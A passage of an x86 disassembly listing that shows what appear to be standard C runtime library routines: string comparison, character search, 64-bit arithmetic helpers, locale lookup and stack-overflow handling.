  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    eax,DWORD PTR [ebp+0x8]
  426b99:	pop    esi
  426b9a:	pop    edi
  426b9b:	leave  
  426b9c:	ret    
  426b9d:	lea    ecx,[ecx+0x0]
  426ba0:	mov    al,BYTE PTR [esi+0x3]
  426ba3:	mov    BYTE PTR [edi+0x3],al
  426ba6:	mov    al,BYTE PTR [esi+0x2]
  426ba9:	mov    BYTE PTR [edi+0x2],al
  426bac:	mov    eax,DWORD PTR [ebp+0x8]
  426baf:	pop    esi
  426bb0:	pop    edi
  426bb1:	leave  
  426bb2:	ret    
  426bb3:	nop
  426bb4:	mov    al,BYTE PTR [esi+0x3]
  426bb7:	mov    BYTE PTR [edi+0x3],al
  426bba:	mov    al,BYTE PTR [esi+0x2]
  426bbd:	mov    BYTE PTR [edi+0x2],al
  426bc0:	mov    al,BYTE PTR [esi+0x1]
  426bc3:	mov    BYTE PTR [edi+0x1],al
  426bc6:	mov    eax,DWORD PTR [ebp+0x8]
  426bc9:	pop    esi
  426bca:	pop    edi
  426bcb:	leave  
  426bcc:	ret    
  426bcd:	push   ebp
  426bce:	mov    ebp,esp
  426bd0:	sub    esp,0xc
  426bd3:	mov    eax,ds:0x4646c0
  426bd8:	xor    eax,DWORD PTR [ebp+0x4]
  426bdb:	and    BYTE PTR [ebp-0x6],0x0
  426bdf:	push   0x6
  426be1:	mov    DWORD PTR [ebp-0x4],eax
  426be4:	lea    eax,[ebp-0xc]
  426be7:	push   eax
  426be8:	push   0x1004
  426bed:	push   DWORD PTR [ebp+0x8]
  426bf0:	call   DWORD PTR ds:0x42811c
  426bf6:	test   eax,eax
  426bf8:	jne    0x426bff
  426bfa:	or     eax,0xffffffff
  426bfd:	jmp    0x426c09
  426bff:	lea    eax,[ebp-0xc]
  426c02:	push   eax
  426c03:	call   0x426f0e
  426c08:	pop    ecx
  426c09:	mov    ecx,DWORD PTR [ebp-0x4]
  426c0c:	xor    ecx,DWORD PTR [ebp+0x4]
  426c0f:	call   0x42401c
  426c14:	leave  
  426c15:	ret    
  426c16:	push   0x38
  426c18:	push   0x428f00
  426c1d:	call   0x423950
  426c22:	mov    eax,ds:0x4646c0
  426c27:	xor    eax,DWORD PTR [ebp+0x4]
  426c2a:	mov    DWORD PTR [ebp-0x1c],eax
  426c2d:	xor    edi,edi
  426c2f:	mov    DWORD PTR [ebp-0x20],edi
  426c32:	mov    DWORD PTR [ebp-0x24],edi
  426c35:	mov    eax,DWORD PTR [ebp+0x14]
  426c38:	mov    ebx,DWORD PTR [eax]
  426c3a:	mov    DWORD PTR [ebp-0x28],ebx
  426c3d:	mov    DWORD PTR [ebp-0x2c],edi
  426c40:	mov    eax,DWORD PTR [ebp+0x8]
  426c43:	cmp    eax,DWORD PTR [ebp+0xc]
  426c46:	je     0x426dbf
  426c4c:	lea    ecx,[ebp-0x40]
  426c4f:	push   ecx
  426c50:	push   eax
  426c51:	mov    esi,DWORD PTR ds:0x4280e0
  426c57:	call   esi
  426c59:	test   eax,eax
  426c5b:	je     0x426c7d
  426c5d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c61:	jne    0x426c7d
  426c63:	lea    eax,[ebp-0x40]
  426c66:	push   eax
  426c67:	push   DWORD PTR [ebp+0xc]
  426c6a:	call   esi
  426c6c:	test   eax,eax
  426c6e:	je     0x426c7d
  426c70:	cmp    DWORD PTR [ebp-0x40],0x1
  426c74:	jne    0x426c7d
  426c76:	mov    DWORD PTR [ebp-0x2c],0x1
  426c7d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c80:	je     0x426c9c
  426c82:	cmp    ebx,0xffffffff
  426c85:	je     0x426c8b
  426c87:	mov    esi,ebx
  426c89:	jmp    0x426c97
  426c8b:	push   DWORD PTR [ebp+0x10]
  426c8e:	call   0x423f60
  426c93:	pop    ecx
  426c94:	mov    esi,eax
  426c96:	inc    esi
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	jmp    0x426c9f
  426c9c:	mov    esi,DWORD PTR [ebp-0x44]
  426c9f:	cmp    DWORD PTR [ebp-0x2c],edi
  426ca2:	jne    0x426cbe
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   ebx
  426ca7:	push   DWORD PTR [ebp+0x10]
  426caa:	push   0x1
  426cac:	push   DWORD PTR [ebp+0x8]
  426caf:	call   DWORD PTR ds:0x42810c
  426cb5:	mov    esi,eax
  426cb7:	mov    DWORD PTR [ebp-0x44],esi
  426cba:	cmp    esi,edi
  426cbc:	je     0x426d16
  426cbe:	mov    DWORD PTR [ebp-0x4],edi
  426cc1:	lea    eax,[esi+esi*1]
  426cc4:	add    eax,0x3
  426cc7:	and    eax,0xfffffffc
  426cca:	call   0x4239a0
  426ccf:	mov    DWORD PTR [ebp-0x18],esp
  426cd2:	mov    ebx,esp
  426cd4:	mov    DWORD PTR [ebp-0x48],ebx
  426cd7:	lea    eax,[esi+esi*1]
  426cda:	push   eax
  426cdb:	push   edi
  426cdc:	push   ebx
  426cdd:	call   0x426250
  426ce2:	add    esp,0xc
  426ce5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426ce9:	jmp    0x426d02
  426ceb:	xor    eax,eax
  426ced:	inc    eax
  426cee:	ret    
  426cef:	mov    esp,DWORD PTR [ebp-0x18]
  426cf2:	call   0x426de5
  426cf7:	xor    edi,edi
  426cf9:	xor    ebx,ebx
  426cfb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cff:	mov    esi,DWORD PTR [ebp-0x44]
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d24
  426d06:	push   esi
  426d07:	push   0x2
  426d09:	call   0x424a68
  426d0e:	pop    ecx
  426d0f:	pop    ecx
  426d10:	mov    ebx,eax
  426d12:	cmp    ebx,edi
  426d14:	jne    0x426d1d
  426d16:	xor    eax,eax
  426d18:	jmp    0x426dd1
  426d1d:	mov    DWORD PTR [ebp-0x24],0x1
  426d24:	push   esi
  426d25:	push   ebx
  426d26:	push   DWORD PTR [ebp-0x28]
  426d29:	push   DWORD PTR [ebp+0x10]
  426d2c:	push   0x1
  426d2e:	push   DWORD PTR [ebp+0x8]
  426d31:	call   DWORD PTR ds:0x42810c
  426d37:	test   eax,eax
  426d39:	je     0x426dc2
  426d3f:	cmp    DWORD PTR [ebp+0x18],edi
  426d42:	je     0x426d64
  426d44:	push   edi
  426d45:	push   edi
  426d46:	push   DWORD PTR [ebp+0x1c]
  426d49:	push   DWORD PTR [ebp+0x18]
  426d4c:	push   esi
  426d4d:	push   ebx
  426d4e:	push   edi
  426d4f:	push   DWORD PTR [ebp+0xc]
  426d52:	call   DWORD PTR ds:0x428090
  426d58:	test   eax,eax
  426d5a:	je     0x426dc2
  426d5c:	mov    eax,DWORD PTR [ebp+0x18]
  426d5f:	mov    DWORD PTR [ebp-0x20],eax
  426d62:	jmp    0x426dc2
  426d64:	cmp    DWORD PTR [ebp-0x2c],edi
  426d67:	jne    0x426d7f
  426d69:	push   edi
  426d6a:	push   edi
  426d6b:	push   edi
  426d6c:	push   edi
  426d6d:	push   esi
  426d6e:	push   ebx
  426d6f:	push   edi
  426d70:	push   DWORD PTR [ebp+0xc]
  426d73:	call   DWORD PTR ds:0x428090
  426d79:	mov    esi,eax
  426d7b:	cmp    esi,edi
  426d7d:	je     0x426dc2
  426d7f:	push   esi
  426d80:	push   0x1
  426d82:	call   0x424a68
  426d87:	pop    ecx
  426d88:	pop    ecx
  426d89:	mov    DWORD PTR [ebp-0x20],eax
  426d8c:	cmp    eax,edi
  426d8e:	je     0x426dc2
  426d90:	push   edi
  426d91:	push   edi
  426d92:	push   esi
  426d93:	push   eax
  426d94:	push   esi
  426d95:	push   ebx
  426d96:	push   edi
  426d97:	push   DWORD PTR [ebp+0xc]
  426d9a:	call   DWORD PTR ds:0x428090
  426da0:	cmp    eax,edi
  426da2:	jne    0x426db2
  426da4:	push   DWORD PTR [ebp-0x20]
  426da7:	call   0x42455a
  426dac:	pop    ecx
  426dad:	mov    DWORD PTR [ebp-0x20],edi
  426db0:	jmp    0x426dc2
  426db2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426db6:	je     0x426dc2
  426db8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dbb:	mov    DWORD PTR [ecx],eax
  426dbd:	jmp    0x426dc2
  426dbf:	mov    ebx,DWORD PTR [ebp-0x48]
  426dc2:	cmp    DWORD PTR [ebp-0x24],edi
  426dc5:	je     0x426dce
  426dc7:	push   ebx
  426dc8:	call   0x42455a
  426dcd:	pop    ecx
  426dce:	mov    eax,DWORD PTR [ebp-0x20]
  426dd1:	lea    esp,[ebp-0x54]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dd7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dda:	call   0x42401c
  426ddf:	call   0x42398b
  426de4:	ret    
  426de5:	push   ebp
  426de6:	mov    ebp,esp
  426de8:	sub    esp,0x48
  426deb:	push   ebx
  426dec:	push   esi
  426ded:	push   edi
  426dee:	push   0x4
  426df0:	pop    eax
  426df1:	call   0x4239a0
  426df6:	mov    ebx,esp
  426df8:	push   0x1c
  426dfa:	lea    eax,[ebp-0x24]
  426dfd:	push   eax
  426dfe:	push   ebx
  426dff:	call   DWORD PTR ds:0x42805c
  426e05:	test   eax,eax
  426e07:	je     0x426e7a
  426e09:	mov    edi,DWORD PTR [ebp-0x20]
  426e0c:	lea    eax,[ebp-0x48]
  426e0f:	push   eax
  426e10:	call   DWORD PTR ds:0x428128
  426e16:	mov    eax,DWORD PTR [ebp-0x44]
  426e19:	lea    esi,[eax-0x1]
  426e1c:	not    esi
  426e1e:	and    esi,ebx
  426e20:	sub    esi,eax
  426e22:	mov    DWORD PTR [ebp-0x4],eax
  426e25:	mov    eax,ds:0x464d64
  426e2a:	mov    ecx,eax
  426e2c:	dec    ecx
  426e2d:	neg    ecx
  426e2f:	sbb    ecx,ecx
  426e31:	and    ecx,0xffff1000
  426e37:	add    ecx,0x11000
  426e3d:	add    ecx,edi
  426e3f:	cmp    esi,ecx
  426e41:	jb     0x426e7a
  426e43:	cmp    eax,0x1
  426e46:	je     0x426e92
  426e48:	mov    ebx,edi
  426e4a:	mov    edi,0x1000
  426e4f:	push   0x1c
  426e51:	lea    eax,[ebp-0x24]
  426e54:	push   eax
  426e55:	push   ebx
  426e56:	call   DWORD PTR ds:0x42805c
  426e5c:	test   eax,eax
  426e5e:	je     0x426e7a
  426e60:	add    ebx,DWORD PTR [ebp-0x18]
  426e63:	test   DWORD PTR [ebp-0x14],edi
  426e66:	je     0x426e4f
  426e68:	test   BYTE PTR [ebp-0xf],0x1
  426e6c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e6f:	je     0x426e76
  426e71:	xor    eax,eax
  426e73:	inc    eax
  426e74:	jmp    0x426eae
  426e76:	cmp    esi,ebx
  426e78:	jae    0x426e7e
  426e7a:	xor    eax,eax
  426e7c:	jmp    0x426eae
  426e7e:	push   0x4
  426e80:	push   edi
  426e81:	push   DWORD PTR [ebp-0x4]
  426e84:	push   ebx
  426e85:	call   DWORD PTR ds:0x4280ec
  426e8b:	mov    eax,ds:0x464d64
  426e90:	jmp    0x426e94
  426e92:	mov    ebx,esi
  426e94:	dec    eax
  426e95:	neg    eax
  426e97:	sbb    eax,eax
  426e99:	and    eax,0x103
  426e9e:	lea    ecx,[ebp-0x8]
  426ea1:	push   ecx
  426ea2:	inc    eax
  426ea3:	push   eax
  426ea4:	push   DWORD PTR [ebp-0x4]
  426ea7:	push   ebx
  426ea8:	call   DWORD PTR ds:0x428124
  426eae:	lea    esp,[ebp-0x54]
  426eb1:	pop    edi
  426eb2:	pop    esi
  426eb3:	pop    ebx
  426eb4:	leave  
  426eb5:	ret    
  426eb6:	int3   
  426eb7:	int3   
  426eb8:	int3   
  426eb9:	int3   
  426eba:	int3   
  426ebb:	int3   
  426ebc:	int3   
  426ebd:	int3   
  426ebe:	int3   
  426ebf:	int3   
  426ec0:	push   ebp
  426ec1:	mov    ebp,esp
  426ec3:	push   edi
  426ec4:	push   esi
  426ec5:	push   ebx
  426ec6:	mov    esi,DWORD PTR [ebp+0xc]
  426ec9:	mov    edi,DWORD PTR [ebp+0x8]
  426ecc:	mov    al,0xff
  426ece:	mov    edi,edi
  426ed0:	or     al,al
  426ed2:	je     0x426f06
  426ed4:	mov    al,BYTE PTR [esi]
  426ed6:	add    esi,0x1
  426ed9:	mov    ah,BYTE PTR [edi]
  426edb:	add    edi,0x1
  426ede:	cmp    ah,al
  426ee0:	je     0x426ed0
  426ee2:	sub    al,0x41
  426ee4:	cmp    al,0x1a
  426ee6:	sbb    cl,cl
  426ee8:	and    cl,0x20
  426eeb:	add    al,cl
  426eed:	add    al,0x41
  426eef:	xchg   al,ah
  426ef1:	sub    al,0x41
  426ef3:	cmp    al,0x1a
  426ef5:	sbb    cl,cl
  426ef7:	and    cl,0x20
  426efa:	add    al,cl
  426efc:	add    al,0x41
  426efe:	cmp    al,ah
  426f00:	je     0x426ed0
  426f02:	sbb    al,al
  426f04:	sbb    al,0xff
  426f06:	movsx  eax,al
  426f09:	pop    ebx
  426f0a:	pop    esi
  426f0b:	pop    edi
  426f0c:	leave  
  426f0d:	ret    
  426f0e:	push   esi
  426f0f:	push   edi
  426f10:	call   0x423803
  426f15:	mov    edi,DWORD PTR [eax+0x64]
  426f18:	cmp    edi,DWORD PTR ds:0x46481c
  426f1e:	je     0x426f27
  426f20:	call   0x424caf
  426f25:	mov    edi,eax
  426f27:	mov    esi,DWORD PTR [esp+0xc]
  426f2b:	cmp    DWORD PTR [edi+0x28],0x1
  426f2f:	movzx  eax,BYTE PTR [esi]
  426f32:	jle    0x426f42
  426f34:	push   0x8
  426f36:	push   eax
  426f37:	push   edi
  426f38:	call   0x426f96
  426f3d:	add    esp,0xc
  426f40:	jmp    0x426f4c
  426f42:	mov    ecx,DWORD PTR [edi+0x48]
  426f45:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f49:	and    eax,0x8
  426f4c:	test   eax,eax
  426f4e:	je     0x426f53
  426f50:	inc    esi
  426f51:	jmp    0x426f2b
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	cmp    ecx,0x2d
  426f5a:	mov    edx,ecx
  426f5c:	je     0x426f63
  426f5e:	cmp    ecx,0x2b
  426f61:	jne    0x426f67
  426f63:	movzx  ecx,BYTE PTR [esi]
  426f66:	inc    esi
  426f67:	xor    eax,eax
  426f69:	cmp    ecx,0x30
  426f6c:	jl     0x426f78
  426f6e:	cmp    ecx,0x39
  426f71:	jg     0x426f78
  426f73:	sub    ecx,0x30
  426f76:	jmp    0x426f7b
  426f78:	or     ecx,0xffffffff
  426f7b:	cmp    ecx,0xffffffff
  426f7e:	je     0x426f8c
  426f80:	lea    eax,[eax+eax*4]
  426f83:	lea    eax,[ecx+eax*2]
  426f86:	movzx  ecx,BYTE PTR [esi]
  426f89:	inc    esi
  426f8a:	jmp    0x426f69
  426f8c:	cmp    edx,0x2d
  426f8f:	pop    edi
  426f90:	pop    esi
  426f91:	jne    0x426f95
  426f93:	neg    eax
  426f95:	ret    
  426f96:	push   ebp
  426f97:	mov    ebp,esp
  426f99:	push   ecx
  426f9a:	mov    eax,DWORD PTR [ebp+0xc]
  426f9d:	lea    ecx,[eax+0x1]
  426fa0:	cmp    ecx,0x100
  426fa6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fa9:	ja     0x426fb4
  426fab:	mov    ecx,DWORD PTR [ecx+0x48]
  426fae:	movzx  eax,WORD PTR [ecx+eax*2]
  426fb2:	jmp    0x427008
  426fb4:	push   esi
  426fb5:	mov    edx,eax
  426fb7:	sar    edx,0x8
  426fba:	push   edi
  426fbb:	mov    edi,DWORD PTR [ecx+0x48]
  426fbe:	movzx  esi,dl
  426fc1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fc6:	pop    edi
  426fc7:	pop    esi
  426fc8:	je     0x426fd9
  426fca:	and    BYTE PTR [ebp-0x2],0x0
  426fce:	push   0x2
  426fd0:	mov    BYTE PTR [ebp-0x3],al
  426fd3:	mov    BYTE PTR [ebp-0x4],dl
  426fd6:	pop    eax
  426fd7:	jmp    0x426fe3
  426fd9:	and    BYTE PTR [ebp-0x3],0x0
  426fdd:	mov    BYTE PTR [ebp-0x4],al
  426fe0:	xor    eax,eax
  426fe2:	inc    eax
  426fe3:	push   0x1
  426fe5:	push   DWORD PTR [ecx+0x14]
  426fe8:	push   DWORD PTR [ecx+0x4]
  426feb:	lea    ecx,[ebp+0xe]
  426fee:	push   ecx
  426fef:	push   eax
  426ff0:	lea    eax,[ebp-0x4]
  426ff3:	push   eax
  426ff4:	push   0x1
  426ff6:	call   0x426078
  426ffb:	add    esp,0x1c
  426ffe:	test   eax,eax
  427000:	jne    0x427004
  427002:	leave  
  427003:	ret    
  427004:	movzx  eax,WORD PTR [ebp+0xe]
  427008:	and    eax,DWORD PTR [ebp+0x10]
  42700b:	leave  
  42700c:	ret    
  42700d:	int3   
  42700e:	int3   
  42700f:	int3   
  427010:	mov    eax,DWORD PTR [esp+0x8]
  427014:	mov    ecx,DWORD PTR [esp+0x10]
  427018:	or     ecx,eax
  42701a:	mov    ecx,DWORD PTR [esp+0xc]
  42701e:	jne    0x427029
  427020:	mov    eax,DWORD PTR [esp+0x4]
  427024:	mul    ecx
  427026:	ret    0x10
  427029:	push   ebx
  42702a:	mul    ecx
  42702c:	mov    ebx,eax
  42702e:	mov    eax,DWORD PTR [esp+0x8]
  427032:	mul    DWORD PTR [esp+0x14]
  427036:	add    ebx,eax
  427038:	mov    eax,DWORD PTR [esp+0x8]
  42703c:	mul    ecx
  42703e:	add    edx,ebx
  427040:	pop    ebx
  427041:	ret    0x10
  427044:	int3   
  427045:	int3   
  427046:	int3   
  427047:	int3   
  427048:	int3   
  427049:	int3   
  42704a:	int3   
  42704b:	int3   
  42704c:	int3   
  42704d:	int3   
  42704e:	int3   
  42704f:	int3   
  427050:	push   ebp
  427051:	mov    ebp,esp
  427053:	push   edi
  427054:	push   esi
  427055:	push   ebx
  427056:	mov    ecx,DWORD PTR [ebp+0x10]
  427059:	or     ecx,ecx
  42705b:	je     0x4270aa
  42705d:	mov    esi,DWORD PTR [ebp+0x8]
  427060:	mov    edi,DWORD PTR [ebp+0xc]
  427063:	mov    bh,0x41
  427065:	mov    bl,0x5a
  427067:	mov    dh,0x20
  427069:	lea    ecx,[ecx+0x0]
  42706c:	mov    ah,BYTE PTR [esi]
  42706e:	or     ah,ah
  427070:	mov    al,BYTE PTR [edi]
  427072:	je     0x42709b
  427074:	or     al,al
  427076:	je     0x42709b
  427078:	add    esi,0x1
  42707b:	add    edi,0x1
  42707e:	cmp    ah,bh
  427080:	jb     0x427088
  427082:	cmp    ah,bl
  427084:	ja     0x427088
  427086:	add    ah,dh
  427088:	cmp    al,bh
  42708a:	jb     0x427092
  42708c:	cmp    al,bl
  42708e:	ja     0x427092
  427090:	add    al,dh
  427092:	cmp    ah,al
  427094:	jne    0x4270a1
  427096:	sub    ecx,0x1
  427099:	jne    0x42706c
  42709b:	xor    ecx,ecx
  42709d:	cmp    ah,al
  42709f:	je     0x4270aa
  4270a1:	mov    ecx,0xffffffff
  4270a6:	jb     0x4270aa
  4270a8:	neg    ecx
  4270aa:	mov    eax,ecx
  4270ac:	pop    ebx
  4270ad:	pop    esi
  4270ae:	pop    edi
  4270af:	leave  
  4270b0:	ret    
  4270b1:	int3   
  4270b2:	int3   
  4270b3:	int3   
  4270b4:	int3   
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	push   esi
  4270c1:	mov    eax,DWORD PTR [esp+0x14]
  4270c5:	or     eax,eax
  4270c7:	jne    0x4270f1
  4270c9:	mov    ecx,DWORD PTR [esp+0x10]
  4270cd:	mov    eax,DWORD PTR [esp+0xc]
  4270d1:	xor    edx,edx
  4270d3:	div    ecx
  4270d5:	mov    ebx,eax
  4270d7:	mov    eax,DWORD PTR [esp+0x8]
  4270db:	div    ecx
  4270dd:	mov    esi,eax
  4270df:	mov    eax,ebx
  4270e1:	mul    DWORD PTR [esp+0x10]
  4270e5:	mov    ecx,eax
  4270e7:	mov    eax,esi
  4270e9:	mul    DWORD PTR [esp+0x10]
  4270ed:	add    edx,ecx
  4270ef:	jmp    0x427138
  4270f1:	mov    ecx,eax
  4270f3:	mov    ebx,DWORD PTR [esp+0x10]
  4270f7:	mov    edx,DWORD PTR [esp+0xc]
  4270fb:	mov    eax,DWORD PTR [esp+0x8]
  4270ff:	shr    ecx,1
  427101:	rcr    ebx,1
  427103:	shr    edx,1
  427105:	rcr    eax,1
  427107:	or     ecx,ecx
  427109:	jne    0x4270ff
  42710b:	div    ebx
  42710d:	mov    esi,eax
  42710f:	mul    DWORD PTR [esp+0x14]
  427113:	mov    ecx,eax
  427115:	mov    eax,DWORD PTR [esp+0x10]
  427119:	mul    esi
  42711b:	add    edx,ecx
  42711d:	jb     0x42712d
  42711f:	cmp    edx,DWORD PTR [esp+0xc]
  427123:	ja     0x42712d
  427125:	jb     0x427136
  427127:	cmp    eax,DWORD PTR [esp+0x8]
  42712b:	jbe    0x427136
  42712d:	dec    esi
  42712e:	sub    eax,DWORD PTR [esp+0x10]
  427132:	sbb    edx,DWORD PTR [esp+0x14]
  427136:	xor    ebx,ebx
  427138:	sub    eax,DWORD PTR [esp+0x8]
  42713c:	sbb    edx,DWORD PTR [esp+0xc]
  427140:	neg    edx
  427142:	neg    eax
  427144:	sbb    edx,0x0
  427147:	mov    ecx,edx
  427149:	mov    edx,ebx
  42714b:	mov    ebx,ecx
  42714d:	mov    ecx,eax
  42714f:	mov    eax,esi
  427151:	pop    esi
  427152:	ret    0x10
  427155:	int3   
  427156:	int3   
  427157:	int3   
  427158:	int3   
  427159:	int3   
  42715a:	int3   
  42715b:	int3   
  42715c:	int3   
  42715d:	int3   
  42715e:	int3   
  42715f:	int3   
  427160:	lea    eax,[edx-0x1]
  427163:	pop    ebx
  427164:	ret    
  427165:	lea    esp,[esp+0x0]
  42716c:	lea    esp,[esp+0x0]
  427170:	xor    eax,eax
  427172:	mov    al,BYTE PTR [esp+0x8]
  427176:	push   ebx
  427177:	mov    ebx,eax
  427179:	shl    eax,0x8
  42717c:	mov    edx,DWORD PTR [esp+0x8]
  427180:	test   edx,0x3
  427186:	je     0x42719d
  427188:	mov    cl,BYTE PTR [edx]
  42718a:	add    edx,0x1
  42718d:	cmp    cl,bl
  42718f:	je     0x427160
  427191:	test   cl,cl
  427193:	je     0x4271e6
  427195:	test   edx,0x3
  42719b:	jne    0x427188
  42719d:	or     ebx,eax
  42719f:	push   edi
  4271a0:	mov    eax,ebx
  4271a2:	shl    ebx,0x10
  4271a5:	push   esi
  4271a6:	or     ebx,eax
  4271a8:	mov    ecx,DWORD PTR [edx]
  4271aa:	mov    edi,0x7efefeff
  4271af:	mov    eax,ecx
  4271b1:	mov    esi,edi
  4271b3:	xor    ecx,ebx
  4271b5:	add    esi,eax
  4271b7:	add    edi,ecx
  4271b9:	xor    ecx,0xffffffff
  4271bc:	xor    eax,0xffffffff
  4271bf:	xor    ecx,edi
  4271c1:	xor    eax,esi
  4271c3:	add    edx,0x4
  4271c6:	and    ecx,0x81010100
  4271cc:	jne    0x4271ea
  4271ce:	and    eax,0x81010100
  4271d3:	je     0x4271a8
  4271d5:	and    eax,0x1010100
  4271da:	jne    0x4271e4
  4271dc:	and    esi,0x80000000
  4271e2:	jne    0x4271a8
  4271e4:	pop    esi
  4271e5:	pop    edi
  4271e6:	pop    ebx
  4271e7:	xor    eax,eax
  4271e9:	ret    
  4271ea:	mov    eax,DWORD PTR [edx-0x4]
  4271ed:	cmp    al,bl
  4271ef:	je     0x427227
  4271f1:	test   al,al
  4271f3:	je     0x4271e4
  4271f5:	cmp    ah,bl
  4271f7:	je     0x427220
  4271f9:	test   ah,ah
  4271fb:	je     0x4271e4
  4271fd:	shr    eax,0x10
  427200:	cmp    al,bl
  427202:	je     0x427219
  427204:	test   al,al
  427206:	je     0x4271e4
  427208:	cmp    ah,bl
  42720a:	je     0x427212
  42720c:	test   ah,ah
  42720e:	je     0x4271e4
  427210:	jmp    0x4271a8
  427212:	pop    esi
  427213:	pop    edi
  427214:	lea    eax,[edx-0x1]
  427217:	pop    ebx
  427218:	ret    
  427219:	lea    eax,[edx-0x2]
  42721c:	pop    esi
  42721d:	pop    edi
  42721e:	pop    ebx
  42721f:	ret    
  427220:	lea    eax,[edx-0x3]
  427223:	pop    esi
  427224:	pop    edi
  427225:	pop    ebx
  427226:	ret    
  427227:	lea    eax,[edx-0x4]
  42722a:	pop    esi
  42722b:	pop    edi
  42722c:	pop    ebx
  42722d:	ret    
  42722e:	jmp    DWORD PTR ds:0x428120
